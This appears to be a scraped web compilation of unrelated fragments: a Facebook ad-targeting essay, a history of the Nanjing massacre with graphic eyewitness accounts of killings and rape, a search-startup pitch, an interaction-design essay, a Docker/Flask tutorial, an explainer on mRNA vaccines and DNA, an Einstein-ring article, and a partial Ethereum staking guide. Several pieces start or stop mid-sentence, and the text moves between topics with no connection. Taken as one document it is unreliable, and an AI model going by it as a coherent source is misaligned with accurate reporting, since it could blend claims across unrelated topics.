Facebook Ads are many, and so to give one answer that covers all advertisers is to oversimplify the matter.</p><p>One important distinction between ways that advertisers use the platform, and which is relevant to whether accuracy matters (for them), is whether they're a <em>brand</em> or <em>direct response</em> advertiser.</p><h3>Brand advertisers</h3><p>A brand advertiser advertises to build their brand. They're not (at least directly) measuring sales that result from their ads. Instead, they're more interested in building so-called <em>brand metrics</em> (brand awareness, brand favorability, et cetera) in the minds of their target audience.</p><p>This last point, of building brand metrics amongst a target audience, is important. If you run a brand selling pet food, then your brand metrics only really matter amongst people who own pets. It doesn't matter if non-pet-owners know your brand or not; they're highly unlikely to ever give you money.</p><p>Brand advertisers are in a precarious position therefore. It's critical for them to have accurate targeting data in order to reach their target audience, but they have to rely on Facebook for this targeting data. Facebook might mis-sell brand advertisers on the ability to target a particular audience on Facebook Ads, yet the brand advertiser has no alternative but to trust Facebook.</p><p>To make matters worse, there's no real ability for the brand advertiser to validate the audience data that they're paying for. Because the brand advertiser isn't measuring the success of their advertising through direct sales, or anything that would give you a sense of how accurate Facebook's audience data really is, it's difficult for them to question the data they're given.</p><p>All of this means that brand advertisers are hurt particularly hard by inaccurate targeting data within Facebook Ads.</p><h3>Direct response advertisers</h3><p>The other main category of advertiser, and the one with which most are more familiar, is the direct response (DR) advertiser.</p><p>A DR advertiser runs ads solely for the purpose of generating a response. For the majority, this is some form of website or app-based conversion; perhaps a registration or a purchase from the advertiser's site.</p><p>Unlike with brand advertisers, DR advertisers have a tight feedback loop between spend and ROI. A DR advertiser will have their ad campaigns hooked up to their conversion event (a purchase on their site, for instance) and will only spend on ads so long as they're able to drive conversion events efficiently.</p><p>If a DR advertiser isn't able to generate conversions efficiently (i.e. where their cost per conversion is below their product's LTV), they'll simply pull spend.</p><p>In this way, the DR advertiser relies on faith in Facebook Ads to a much smaller extent than the brand advertiser. If a particular audience on Facebook Ads had horrific accuracy, the DR advertiser would likely notice this in the form of a low ROI, and simply choose to put her budget elsewhere. In this sense, low-accuracy audience data hurts DR advertisers far less than their brand counterparts.</p><h3>Auction mechanics</h3><p>The other thing to note, particularly when it comes to DR advertisers, is about how prices are set on Facebook Ads.</p><p>Prices are set using a (second price) auction, which means you effectively pay a (constantly changing) market rate to show your ads.</p><p>This auction pricing means that the cost to reach a particular audience is relative to how <em>good</em> it is deemed to be by other advertisers (where <em>good</em> essentially means <em>profitable</em>). If a particular audience on Facebook has low accuracy, then this will likely be reflected in advertisers bidding less on that audience, and prices dropping to the point where it's just as efficient to bid on that audience as a more accurate one.</p><p>In this sense, auction-based pricing tends to level out and account for differences in audience quality.</p><h2>Audiences aren't in vogue</h2><p>One last thing that's worth considering, is that most (DR) advertisers nowadays don't take a particularly audience-centric approach to advertising. Gone are the day where you'd pick out a couple of key audiences, and funnel your spend through them.</p><p>Even if Facebook's pre-packaged audience data is lousy, the machine learning that powers its delivery algorithms certainly isn't. Because these algorithms are so efficient at picking out high-value users within any audience, it often doesn't really matter what audience your start with.</p><p>As a result, it's become increasingly common for advertisers to target broader audiences (perhaps a whole country) or use lookalike targeting to effectively create their own audiences.</p><p>This trend is particularly noticeable on larger accounts, where the ads are generating so much data that it makes more sense to let the delivery algorithms run unconstrained by specific audience targeting.</p><p>In this sense, bad audience data is really more of a concern for smaller advertisers. These advertisers may not have enough data to build robust lookalikes from, or to let a campaign run wild across a whole country, and that's why they're pushed towards using Facebook's pre-packaged audiences.</p><h3>In Summary</h3><p>There are really two segments of advertiser hit hardest by Facebook pushing advertisers to bid on inaccurate audience data:</p><ul role="list"><li><strong>Brand advertisers</strong><br>If you're an advertiser that relies on the accuracy of Facebook's audience data, then of course hearing that it can be as low as 9% accurate is going to present problems.</li><li><strong>Smaller advertisers</strong><br>Advertisers who are more reliant on Facebook's pre-packaged audiences, not through their approach to advertising but simply their size, are also disproportionately affected by poor audience data.</li></ul><p>As we saw from data emerging from the 2020 Facebook ad boycott however, the segments above aren't bringing in the lion's share of Facebook's profits. Firstly, direct response advertising likely makes up a far larger chunk of revenue than brand advertising. Secondly, advertisers so small that they're wholly reliant on Facebook's audience data aren't (even in aggregate) going to be worth a huge amount to Facebook's bottom line.</p><p>In this sense, I can't see there being much incentive for Facebook to respond to this wave of criticism by upping their focus on accuracy.</p><p>‍</p></div></div></div>]]>

<p>In 1937, before a shot was even fired in Europe, Imperial Japanese forces were engaged in a long, bloody conflict in China – and it is during this period that we catch a glimpse of the atrocities that would stain the 1940s.&nbsp;</p>
<p>The event, or series of events, we are looking at today is the Japanese occupation of Nanjing, commonly referred to as the ‘Rape of Nanjing’.</p>



<p>Anyone with a modicum of knowledge on the Second World War will know of the atrocities committed by Imperial Japanese forces. Their atrocious treatment of PoW’s and civilians throughout South East Asia, Oceania and China are well documented. Several years before those times however, when Japanese forces entered Nanjing, they let loose upon the people there.</p>
<h4>Crashing dominoes&nbsp;</h4>
<p>In the weeks preceding the Japanese occuptation of Nanjing, there had been bloody fighting between Chinese forces and Imperial Japanese troops. Indeed, for several years, the Imperial Japanese Army had been involved in a tit-for-tat conflict against both Communist and nationalist Chinese forces.</p>
<p>In August 1937, the <a href="https://en.wikipedia.org/wiki/Battle_of_Shanghai" target="_blank" rel="noopener">Battle of Shangai</a> set into motion a series of events that would lead to disaster for Chinese forces and civilians throughout the country. The Battle of Shanghai was a visceral, bloody engagement for both sides. However, by mid-November, Imperial Japanese forces had captured and subjugated the area.&nbsp;</p>

<p>Despite sustaining heavy casualities after weeks of fighting, Japanese forces of the Central China Area Army and 10th Army were ordered to capture the city of Nanjing and the surrounding area. The subsequent advance prompted hysteria among Chinese civilians and military forces, with thousands of the latter desperately trying to avoid capture.&nbsp;</p>
<h4>Cry havoc! and let slip the dogs of war</h4>







<p>Upon entering the city, Japanese forces appear to enter a feral state, abandoning all reason and humanity and embarking on a campaign of terror, abuse and murder against the people of the old Chinese capital.</p>



<p>A truly ghastly affair, and throughout we see sadistic methods and practices by Japanese troops. Groups of individuals were buried alive, some were burned alive, and the lucky ones were simply executed en-masse.</p>



<p>Beheadings were commonplace throughout this event, and there are accounts (although hotly debated) of ‘contests’ between Japanese officers to see who could behead 100 people in the shortest time.</p>





<p>In 1937, Japanese media covered the story of Toshiaki Mukai and Tsuyoshi Noda of the Japanese 16th Division, who were both vying to reach this goal of 100 beheadings. Throughout the course of the war these two men are alleged to have murdered over 300 people between them, and upon Japan’s surrender in 1945 the officers were tried and executed for war crimes.</p>



<p>While crimes were being committed against the civilian population, scores of Chinese prisoners of war were ruthlessly executed. The execution of prisoners of war were also particularly sadistic and brutal.</p>



<p>Countless PoW’s were hanged, shot and beheaded, with many more being buried alive alongside civilians. To this day the number of Chinese PoW’s executed is still unknown.</p>

<h4>Accounts by westerners</h4>



<p>As hostilities had not yet erupted between western nations and Japan, there were a range of western civilians in the city during this event, and their accounts of the actions of Japanese soldiers are harrowing.</p>



<p>A surgeon, Robert O. Wilson, in the university hospital within the US safety zone, wrote home on several occasions detailing the events unfolding before his eyes.</p>



<p>“The slaughter of civilians is appalling. I could go on for pages telling of cases of rape and brutality almost beyond belief,” he wrote. “Two bayoneted corpses are the only survivors of seven street cleaners who were sitting in their headquarters when Japanese soldiers came in without warning and killed five of their number and wounded the two that found their way to the hospital.”</p>
<p>The Minnie Vautrin Diary detailing atrocities provides some of the most compelling and harrowing accounts of the Nanjing Massacre. Excerpts detailing what she witnessed can be found online, or the diary itself can be purchased.</p>



<p>In her diary she details the callous brutality of Japanese soldiers and, in particular, their treatment of Chinese women.</p>



<p>“A woman of almost 50 living down near San Pai Lou.&nbsp;She had three sons and two daughters-in-law. Four nights ago two soldiers came to the door at about 10pm, unable to push the door they forced their way in through a window and found themselves in Liu Lau Tai’s room.</p>





<p>“They demanded her daughters-in-law and when she refused and started to go for a military police they cut two gashes in her face and one in her heart.&nbsp;She died from these wounds.”</p>





<h4>Age old barbarism</h4>



<p>Japanese soldiers employed an age old weapon against the people of Nanjing, rape. Assault on women throughout the Nanjing Massacre were widespread and anywhere up to 20,000 women and girls were raped and brutalised.</p>







<p>John Rabe, leader of the Nanjing Safety Zone details his experiences in dealing with these cases during his time in the city.</p>



<p>“In one of the houses in the narrow street behind my garden wall, a woman was raped, and then wounded in the neck with a bayonet. I managed to get an ambulance so we can take her to Kulou Hospital.</p>





<p>“Last night up to 1,000 women and girls are said to have been raped, about 100 girls at Ginling College alone.</p>



<p>“You hear nothing but rape. If husbands or brothers intervene, they’re shot. What you hear and see on all sides is the brutality and bestiality of the Japanese soldiers.”</p>

<h4>Relenting troops</h4>



<p>In January of 1938, after several weeks of bloodletting, refugees within the safety zones were ordered to return to their homes.</p>



<p>Japanese officials claimed at the time that ‘order had been restored’ and that daily life were to continue as normal. For the people of Nanjing subjected to relentless bouts of violence, however, life would never be the same again.</p>



<p>As order was gradually restored, the frequency of attacks and atrocities did dissipate.</p>
<h4>Guilt</h4>



<p>General Iwane Matsui, leader of the Japanese Expeditionary Force in China, began to realise the extent of the atrocities being committed by his men in Nanjing – albeit too late.</p>



<p>Speaking of his knowledge on the atrocities being committed, he is claimed to have stated to an aide:</p>



<p>“I now realise that we have unknowingly wrought a most grievous effect on this city. When I think of the feelings and sentiments of many of my Chinese friends who have fled from Nanjing and of the future of the two countries, I cannot but feel depressed.</p>



<p>“I am very lonely and can never get in a mood to rejoice about this victory … I personally feel sorry for the tragedies to the people, but the Army must continue unless China repents.</p>



<p>“Now, in the winter, the season gives time to reflect. I offer my sympathy, with deep emotion, to a million innocent people.”</p>



<p>Although an apparent admission of guilt on his part, Matsui’s lack of action on the issue, his burying of the head in sand, simply allowed the ordeal to continue far longer than it did.</p>



<p>Matsui was recalled to Japan following the massacre and retired. Upon Japan’s surrender in 1945, he was tried by the International Military Tribunal for the Far East and is executed.</p>



<h4>Aftermath</h4>



<p>The death toll in Nanjing is debated. Contemporary Japanese statistics could be considered laughable, amounting to only several hundred dead. A range of sources estimate that anywhere between 30,000 to 300,000 people were murdered during this month-long tirade of violence.</p>
<p>Modern Chinese sources (in particular the Chinese Government) claim that these numbers range even higher and are, in fact, closer to half-a-million.</p>




<p>The Nanjing War Crimes Tribunal in 1947 stated:</p>



<p>“More than 190,000 mass slaughtered civilians and Chinese soldiers killed by machine gun by the Japanese army, whose corpses have been burned to destroy proof.</p>



<p>“Besides, we count more than 150,000 victims of barbarian acts buried by the charity organisations. We thus have a total of more than 300,000 victims.”</p>



<p>Researchers state that the death toll numbers between 40,000 and 60,000 based on a number of sources from the time, including Red Army statistics and the Nanjing Safety Zone committee.</p>



<p>Regardless of the true number of casualties, the barbarism and horrific nature of this event are beyond comprehension. The callous behaviour of Japanese soldiers is a stain on the tapestry of 20th century history, and this behaviour continued for another several years until Japanese capitulation in the wake of Hiroshima &amp; Nagasaki.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>   <p>[TL;DR: Google has gotten bad; we all know it; ideas for a startup making a better Google.]</p> <p>In 2000, Google got popular because hackers realized it was better than Lycos or Excite. This effect is happening again. Early adopters aren’t using Google anymore.</p> <p>They aren’t using DuckDuckGo either. They’re still using Google.com, but differently. To make Google usable, users are adding faux-query modifiers that to supress the “garbage Internet”.</p> <p>You see this in the typeahead logs.</p> <p><img src="https://dcgross.com/assets/new-google/image6.png" alt=""> <em></em></p><center><em>Products (Reddit)</em></center> <p><img src="https://dcgross.com/assets/new-google/image4.png" alt=""> <em></em></p><center><em>Services (Reddit, Yelp)</em></center> <p><img src="https://dcgross.com/assets/new-google/image1.png" alt=""> <em></em></p><center><em>Movies (Rotten Tomatoes)</em></center> <p><img src="https://dcgross.com/assets/new-google/image5.png" alt=""> <em></em></p><center><em>Even code (Github)</em></center> <p>Interestingly, this doesn’t work for all categories. <img src="https://dcgross.com/assets/new-google/image3.png" alt=""> <img src="https://dcgross.com/assets/new-google/image2.png" alt=""> <em></em></p><center><em>Recipes don’t have a “Reddit” equivalent</em></center> <h3 id="query-operators-mean-somethings-broken">Query Operators Mean Something’s Broken</h3> <p>More advanced users use modifiers like <code>site: filetype: intitle:</code> because adding “reddit” isn’t strict enough, as spammy websites often manipulate content to win SEO.</p> <p>How about those websites that stuff the year in the title? “Reviews UPDATED JANUARY 2020” are exploiting the fact that customers suffix queries with the year. What those people are trying to command is freshness, not a title match.</p> <p>Something’s broken, and a tiny share of Google is open for the taking. Obviously attacking incumbents head-on doesn’t work. Here are two alternative ideas for bootstrapping next-generation search:</p> <h3 id="1-boogle-a-query-reformulator">#1 Boogle, A Query Reformulator</h3> <p>Introducing Boogle, a proxy for Google that’s just Better Google Search. It’s a query expander. We predict the correct operators for your query, proxy Google’s results, and serve. For example:</p> <p><code>query("stripe.js example") -&gt; query("stripe.js example (site:github.com OR site:gitlab.com OR site:..."))</code></p> <p><code>query("is anker charger") -&gt; query("is anker charger (inurl:forum OR site:reddit.com OR ...))"</code></p> <p>Query topic modeling is a rich science with plenty of examples.</p> <p>You’d almost as fast as Google, never worse, and occasionally better. This will help build the reflex to use you instead. This approach isn’t that hard to get started with, and might work for the high-end users.</p>  <p>You could go after this vertical by vertical – build the <em>best</em> site for electric product search, for travel, for code, etc. A key question is how to build habitual recall to use your product over Google. Amazon and Airbnb both enjoy a huge amount of direct traffic. Some learnings from those:</p> <ul> <li><strong>Stellar mobile destination.</strong> Using Airbnb directly feels more fluid and fun than using Google for Airbnb.</li> <li><strong>The 90% Rule.</strong> To build reflex you need to give me what I want most of the time.** **With Prime, Amazon made it such that we stopped price comparing across other sites; Amazon would get it to us fastest, and that turns out to matter more than price. Most of the time you open Amazon.app, it satisfies.</li> <li><strong>Come for search, stay for something else.</strong> I don’t think of Airbnb or Amazon as search apps. They help me get things or book homes. You might want to your search app to be a destination for something else. This is where I think community comes in.</li> </ul> <p>Picking a vertical that <em>doesn’t</em> have strong typeahead completions[1] would help you build community around your search engine. Recipes, fitness, fashion, etc. don’t have decacorn conglomerates like Github or Reddit. That might mean it’s easier to build community around them, and put your flagship search engine on top.</p> <hr> <p>If you’re working on this kind of stuff, try out <a href="https://pioneer.app/">Pioneer</a> or just shoot me an email – daniel@pioneer.app.</p> <hr> <p>[1] In reality I’d pick the vertical _I _love most. If you’re a guitar player start with music; a movie buff should build better Rotten Tomatos. Etc.</p> </article></div>]]>

                    <p>One of the core ideas of interaction design is to enable users to glide smoothly to their destination with as little friction as possible. To make people experience the software as an extension of their brain, and not something to continually wrestle with and domesticate.</p>

<p>Great products ask nothing from you on the first interaction. They’ll let you in and experiment without requiring anything upfront, not even your email address. Usually, until you need to save something. Hoping that, by that moment, they succeeded at demonstrating their value. That’s how removing friction, or only slightly delaying it, gives you a head start on the competition.</p>

<p><img src="https://www.petarperovic.com/assets/friction-github_delete.png" alt="Delete repository on GitHub screen">
<em>This is the exact copy I borrowed from GitHub for the title of this article. When you try to delete a repository, GitHub will force you to correctly type its name, making sure you know what you’re doing.</em></p>

<p>However, there are situations where you deliberately want to make interaction less convenient for users’ benefit. When you purposely want to make them stop and think. Typically when they’re about to perform a potentially destructive action or/and an operation that affects other people in the system. For example, to prevent them from accidentally deleting a project shared between many people and forever losing everyone’s important work. That’s where adding friction saves you from shooting yourself in the foot. As a rule of thumb, whenever there’s a potential of users harming themselves — add friction.</p>

<p>Friction is, however, often abused to deliberately confuse and exploit human anxiety when interacting with computers. Airlines’ websites will routinely scare you into buying garbage services you don’t need. Facebook will emotionally manipulate you if you try to erase it from your life. They’ll try to change your mind through the multi-page process where they’ll show you photos of the family and friends you’ll be missing as if they’d all be dead the moment you delete the account. Likewise, it’s widespread for products to complicate subscription cancellation for no reason, foolishly making users even more aggravated. These are all examples of adding friction in bad faith.</p>

<p>Physical world is also full of deliberately added friction, usually to prevent people from making dumb mistakes. Streets around schools slow down traffic with physical obstacles and flashing signals to protect little humans from deadly, fast-moving machines. Modern cars will poke you with annoying noise to fasten your seatbelt, dramatically increasing your chances of survival in case of an accident. Automatic sliding doors remove friction to increase the flow of people in high traffic, commercial buildings. Preventing the formation of queues, but also helping to maintain the temperature of the building. And so on…</p>

<p>At every point of human interaction with digital or physical interfaces, there’s friction. I find it incredibly useful to think about interaction design as adjusting friction, thus controlling the heartbeat of communication between humans and machines.</p>

<p>When we develop more than one python project, we need to configure our development environment with the dependencies of all the projects. This becomes even more complicated when there are many people on the development of the project.
To do this, you need to create a development environment that is isolated from the others. We can do this thanks to <strong>docker</strong> containers.</p>
<h2 id="prepare-project">Prepare project</h2>
<p>Let’s imagine that our project has this structure:</p>
<pre><code data-lang="console">pydk
├─── requirements.txt
└─── src
     └─── server.py
</code></pre><p>We now think that our project may depend on some external libraries, such as <strong>Flask</strong>. Let’s prepare a file called <em>requirements.txt</em> with a line inside it: <code>Flask==1.1.2</code></p>
<p>While our <em>server.py</em> application, it will be a simple Flask application like the following:</p>
<div><pre><code data-lang="python"><span>from</span> <span>flask</span> <span>import</span> <span>Flask</span>
<span>server</span> <span>=</span> <span>Flask</span><span>(</span><span>__name__</span><span>)</span>

<span>@server.route</span><span>(</span><span>"/"</span><span>)</span>
<span>def</span> <span>hello_docker</span><span>():</span>
    <span>return</span> <span>"Hello docker!"</span>

<span>if</span> <span>__name__</span> <span>==</span> <span>"__main__"</span><span>:</span>
   <span>server</span><span>.</span><span>run</span><span>(</span><span>host</span><span>=</span><span>'0.0.0.0'</span><span>)</span>
</code></pre></div><p>Now, we can run and continue to develop this project locally, but if we had other projects with requirements that would conflict, we would break this or other projects.
So, let’s see how we can isolate this project inside a container that is the same for all the developers who are going to develop.</p>
<h2 id="prepare-dockerfile">Prepare dockerfile</h2>
<p>Now we need to create a <em>Dockerfile</em> (<code>pydk/Dockerfile</code>) that contains suitable instructions to build our container so that it can execute our python code.</p>
<div><pre><code data-lang="dockerfile"><span># base image</span><span>
</span><span></span><span>FROM</span><span> python:3.9</span><span>
</span><span>
</span><span></span><span># working directory in the container</span><span>
</span><span></span><span>WORKDIR</span><span> /pydk</span><span>
</span><span>
</span><span></span><span># copy the dependencies file to the working directory</span><span>
</span><span></span><span>COPY</span> requirements.txt .<span>
</span><span>
</span><span></span><span># install dependencies</span><span>
</span><span></span><span>RUN</span> pip install -r requirements.txt<span>
</span><span>
</span><span></span><span># copy the content of the local src directory to the working directory</span><span>
</span><span></span><span>COPY</span> src/ .<span>
</span><span>
</span><span></span><span># command to run on container start</span><span>
</span><span></span><span>CMD</span> <span>[</span> <span>"python"</span><span>,</span> <span>"./server.py"</span> <span>]</span><span>
</span></code></pre></div><p>Now we run the command to build our image. When docker builder kicks in, you can see all the steps we wrote in our dockerfile:</p>

That would actually be super cool and be huge for gene therapy (and I could finally give myself the giant bat wings I’ve always wanted) but this is not so. This is ordinarily impossible except if there is also a reverse transcriptase enzyme present that produces DNA from the RNA template, which is how retroviruses work. There is no such risk with any mRNA vaccine candidate. mRNA vaccines act entirely within the cytosol of the cell- they do not go near the nucleus where all the DNA is. That’s actually a major advantage of RNA-based vaccines over DNA ones.</p></blockquote></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1606177725054_56388"><div>

Figure 5.23C which shows the nuclear import cycle with influenza ribonucleoproteins as an example. Nucleear localization signals are recognized by importin-α which then recruits importin-β which recruits a small GTPase called Ran. When binding GDP, Ran is able to transport the RNP across the nuclear pore complex. The complex of importins and Ran will then dissociate, and a guanine nucleotide exchange factor will exchange GDP for GTP, that allows Ran-GTP to be exported out of the nucleus. RanGAP-1 or RanBPI, 2 can then catalyze hydrolysis of GTP to GDP which allows Ran to bind another importin-β to initiate the import cycle once more. </p>

</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1606190121308_43147"><div><p>I gave this response in large part because I felt that the detailed discussion of reverse transcription, nuclear trafficking, the endocytic pathway, and the other 11 or so advanced cell biology topics that I would have to invoke to give this a rigorous answer was too complex to be of benefit to the average person wanting to know simply whether or not this is possible. However, I had a flurry of questions about “what ifs” relating to retroviruses or hepadnaviruses (hepatitis B), and I can grant that this response doesn’t address that, so here I will attempt to answer that as explicitly and with minimal complexity as I am capable. </p><p>To simplify the discussion so as to avoid having to explain the <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC4377075/">phases of phospholipid bilayers</a> and the molecular composition of the lipid nanoparticle as it relates to stability (discussed in <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC5439223/pdf/tde-07-319.pdf">1</a>, <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC6383180/pdf/main.pdf">2</a>, <a href="https://www.cell.com/action/showPdf?pii=S1525-0016%2819%2930041-3">3</a>, <a href="https://www.cell.com/action/showPdf?pii=S1525-0016%2819%2930053-X">4</a>), I will ask readers take for granted that mRNA vaccines are endocytosed and <a href="https://www.nature.com/articles/3301506.pdf">liberated</a> (<a href="https://pubs.acs.org/doi/pdf/10.1021/acsami.8b21398">and this</a>) into the cytoplasm of the cell. </p><p>Firstly, for mRNA to affect your DNA, at a minimum we need to establish that it would need to gain access to the DNA in question. There are two subcellular compartments where this can be accomplished. The first is the nucleus, so let’s start with a discussion of the trafficking of cargo in the nucleus. The nucleus of the cell is an isolated compartment with pore complexes (NPCs) that impose limits on the size of the particles that can freely enter. RNA is readily transported out as transcription occurs within the nucleus but the ribosomes required to produce proteins are in the cytosol or on the rough endoplasmic reticulum. This process is mediated by several accessory proteins which you can see to your right. Note however that there isn’t any physiological circumstance in which one might need RNA from the cytosol to be transported back to the nucleus. RNA is synthesized within the nucleus. Viruses which have a nuclear phase in their replication cycle have to have various tricks to be able to allow their RNA payload to enter. Though RNA is not readily transported into cells, proteins can be. This occurs via a network of proteins called importins (see figure 5-23C on the right). Proteins containing an amino acid sequence called the nuclear localization sequence (NLS; there are 2 common ones) are able to bind the importins, which can then transport them across the nuclear pore complex as shown on the right. RNA viruses often have replication cycles that do not require access to the nucleus, but there are some exceptions. <a href="https://jvi.asm.org/content/jvi/84/3/1254.full.pdf">Influenza viruses for example are RNA viruses that have their genomes associated with ribonucleoproteins, and these ribonucleoproteins express nuclear localization signals that facilitates the entry of their genomic RNA into the nucleus</a>. mRNA vaccines, on the other hand, are not associated with any proteins. Once inside the cytosol, the mRNA is naked and exposed to the harsh environment of ribosomes and exonucleases which destroy the mRNA in a matter of hours (at most). There is no conceivable mechanism by which mRNA can spontaneously be trafficked into the nucleus. Being made of nucleotides, it cannot contain a nuclear localization sequence. </p><p>The other relevant compartment would be the mitochondrion. Mitochondria are actually vestigial bacteria with their own genomes, and it’s thought that billions of years ago an ancient cell (probably an archaean- the cousins of bacteria) tried to consume the ancestor of the mitochondria but lacked the machinery to actually do the digesting and the two established a symbiotic relationship. Since that instance, the mitochondria have been an essential feature of our cell’s biologies. This allowed the mitochondria to develop an extremely reduced genome containing only<a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC5215404/pdf/PATH-241-236.pdf"> 37 genes</a> (most of the genes relevant to mitochondrial function are still in the nucleus). Mitochondria have their <a href="https://www.pnas.org/content/pnas/116/17/8283.full.pdf">own ribosomes</a> and even their own <a href="https://www.nature.com/articles/282189a0">genetic code</a> (sort of). There is also a specialized process for the clearance of diseased mitochondria called <strong>mitophagy, </strong>which is the subject of many excellent reviews e.g. <a href="https://www.nejm.org/doi/full/10.1056/NEJMoa2001265">this</a>, <a href="https://www.nature.com/articles/s41556-018-0176-2">this</a>, and <a href="https://www.cell.com/current-biology/pdf/S0960-9822(18)30006-X.pdf">this</a>. </p><p>The collective conclusion from our understanding of these biological process is that a naked mRNA in the cytosol has no potential to end up in a cellular compartment that contains our own DNA means that, irrespective of the presence or absence of other factors, there is no chance of harm to the DNA from the mRNA vaccine. But still people wanted to ask me about reverse transcriptases so let’s discuss those.</p><p>The process of going from RNA to DNA (the exact opposite of what the central dogma of molecular biology dictates) is known as <strong>reverse transcription</strong>, and it is carried out with an enzyme called a <strong>reverse transcriptase </strong>(which are a really interesting group of enzymes). In general, reverse transcription is performed by a few different genetic entities: <strong>retroviruses</strong>, <strong>hepadnaviruses</strong>, <strong>telomeres</strong>, and <strong>retrotransposons</strong>. These are worth defining. </p><ul data-rte-list="default"><li><p>Retroviruses are viruses who have an RNA genome, from which they create a DNA copy through reverse transcription that then integrates into the cell of the host (by which I mean, literally inserts itself into the host cell’s genome and becomes a permanent part of it, in the form of a sequence called a <strong>provirus</strong>). The proviral sequence itself can then be transcribed in the host cell to produce viral proteins and particles that can go on to spread to the next cell. The most famous retrovirus is HIV-1. </p></li><li><p>Hepadnaviruses are DNA viruses which have gapped genomes (there is one complete DNA strand and another partial DNA strand which is linked to a pregenomic RNA), and unlike retroviruses, do not integrate into the genome of the host cell they infect. The most famous example is Hepatitis B virus, for which multiple effective vaccines exist. </p></li><li><p>Telomeres are structures present at the ends of human chromosomes which are maintained by a protein complex called telomerase that uses a reverse transcriptase called TERT to maintain them. The reasons this is necessary are discussed below. They are about 5-15 kilobases long normally, and shortening results in arrest of cell growth and replication (senescence), or can even trigger cell death by apoptosis. </p></li></ul></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1606152858324_15060"><div>

						<p>In a photo posted on NASA’s website and Twitter, the administration showed a real example of a breathtaking phenomenon once conjectured only in theory.</p><p>An Einstein ring is created when light from a galaxy or star passes by a massive object en route to the Earth. Because of an effect called "gravitational lensing", light looks to come from different places. If the source, lens, and observer are all properly aligned, we see a circle of light as the light behind the object warps and bends around it.</p><p>The effect was predicted in Albert Einstein's theory of general relativity. Light from a source traveling in a straight line is bent by the presence of a massive body.</p><figure><iframe width="356" height="200" src="https://www.youtube.com/embed/jSwjjgfFyAg?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><p>A story in <a href="https://www.forbes.com/sites/jamiecartereurope/2019/05/29/the-true-story-behind-how-albert-einstein-was-proved-right-at-a-solar-eclipse-100-years-ago-today/?sh=5f5359d155a2">Forbes details</a> the fascinating account of how Einstein actually proved his theory showing the existence of these rings.</p><p>Setting out to prove Einstein, astronomers from Britain traveled to Africa and Brazil to measure the exact position of stars in the Hyades star cluster in the constellation of Taurus. </p><p>A total solar eclipse was visible from Peru to Mozambique, right across South America, the Atlantic Ocean, and southern Africa. The eclipse plunged a narrow path across the planet into darkness for a few minutes. Astronomers and scientists were dispatched to various places along the track taking photos of the star cluster to compare to photos taken six months earlier.</p><p>The totality on May 29, 1919, lasted six minutes 51 seconds. It was the longest solar eclipse since May 27, 1416. On Príncipe, it lasted 5 minutes 12 seconds. Ultimately, photos from both locations showed light bending in the cluster proving the effect and clinching Einstein's eternal claim to scientific fame.</p><p>GAL-CLUS-022058s is the largest and one of the most complete Einstein rings ever discovered in our universe. The object has been nicknamed by astronomers studying this Einstein ring as the "Molten Ring"</p><figure><img src="https://smosa.com/content/images/2020/12/potw2050a-1.jpg" alt="" srcset="https://smosa.com/content/images/size/w600/2020/12/potw2050a-1.jpg 600w, https://smosa.com/content/images/size/w1000/2020/12/potw2050a-1.jpg 1000w, https://smosa.com/content/images/size/w1600/2020/12/potw2050a-1.jpg 1600w, https://smosa.com/content/images/size/w2400/2020/12/potw2050a-1.jpg 2400w" sizes="(min-width: 720px) 720px"><figcaption>Source: ESA/Hubble &amp; NASA, S.

  <div itemprop="articleBody">
    <p>Ethereum is one of the leading crypto projects (second to bitcoin). In December 2020 Ethereum released the first stage of Ethereum 2.0. The biggest difference is that there is no need for an expensive calculation to validate blockchain transactions, miners can earn money only by staking their coins. This is a shift from proof-of-work to <a href="https://ethereum.org/en/eth2/staking">proof-of-stake</a>. You can read more on the vision <a href="https://ethereum.org/en/eth2/vision">here</a>.</p>

<h3 id="what-does-it-mean-for-you">What does it mean for you?</h3>

<p>If you want to “mine” eth you don’t need to invest in an expensive server farm anymore, all you need is to stake at least 32ETH and run the eth2 clients for as little as $10/month. In return you will earn passive income - currently, <a href="https://docs.google.com/spreadsheets/d/15tmPOvOgi3wKxJw7KQJKoUe-uonbYR6HF7u83LR5Mj4/edit#gid=842896204">around 10%</a>. The more people stake their eth the lower the interest rate will be. You can find the latest rate <a href="https://launchpad.ethereum.org/">here</a>.
In case you have at least 32ETH and you are OK to stake it for at least a year, probably more, until Ethereum reach their <a href="https://docs.ethhub.io/ethereum-roadmap/ethereum-2.0/eth-2.0-phases">next phase</a>, you can use this guide to learn how to do it.
This solution is great if you want to hold your ETH coins for 1-2 years and earn passive income by doing so.
<strong>This guide is for educational purposes only.</strong></p>

<h3 id="install-metamask">Install Metamask</h3>

<p>We will use Metamask as our ethereum wallet. You can install it from <a href="https://metamask.io/">here</a>. Do not lose the password and paraphrase for your wallet.<br>
After you finished installing your wallet, make sure you select the <code>goerli</code> (test) network.
<img src="https://sagivo.com/assets/ethereum-11.png" alt="Metamask Goerli"></p>

<h3 id="get-goerli">Get Goerli</h3>

<p>Since we are using the Goerli test network, we will need some coins to play with. To be a validator you will need ether. You can get test ether coins from <a href="https://faucet.goerli.mudit.blog/">here</a>. All you need is to tweet your <strong>goerli</strong> wallet address. Make sure you ask for at least 32 eth (the minimum for a validator node).</p>

<h3 id="become-eth2-validator">Become eth2 validator</h3>

<p>Go to the Ethereum 2.0 pyrmont (test) <a href="https://pyrmont.launchpad.ethereum.org/">launchpad site</a> and click on <code>GET STARTED</code>. Read all the warnings and information, make sure you understand them all.<br>
The next step is to <a href="https://pyrmont.launchpad.ethereum.org/select-client">select your client</a> - choose <a href="https://github.com/sigp/lighthouse">lighthouse</a>.<br>
Select how much eth you want to stake, 32 eth is the minimum.
